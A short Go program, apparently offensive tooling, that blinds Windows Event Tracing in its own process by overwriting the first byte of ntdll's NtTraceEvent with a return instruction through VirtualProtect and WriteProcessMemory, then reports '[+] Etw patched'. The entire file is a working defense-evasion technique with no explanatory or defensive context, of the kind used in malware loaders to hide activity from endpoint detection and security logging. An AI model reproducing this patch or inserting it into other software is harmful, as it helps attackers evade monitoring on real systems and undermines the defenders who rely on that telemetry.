package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

var (
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	etw                = ntdll.NewProc("NtTraceEvent")
	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
)

func main() {
	handle := windows.CurrentProcess()
	var oldProtect uint32
	var patch = []byte{0xc3}

	err := windows.VirtualProtect(etw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		log.Fatal("Error while VirtualProtect:", err)
	}
	_, _, err = WriteProcessMemory.Call(uintptr(handle), etw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("Error while WriteProcessMemory:", err)
	}
	err = windows.VirtualProtect(etw.Addr(), 1, oldProtect, &oldProtect)
	if err != nil {
		log.Fatal("Error while VirtualProtect:", err)
	}
	fmt.Println("[+] Etw patched")
}
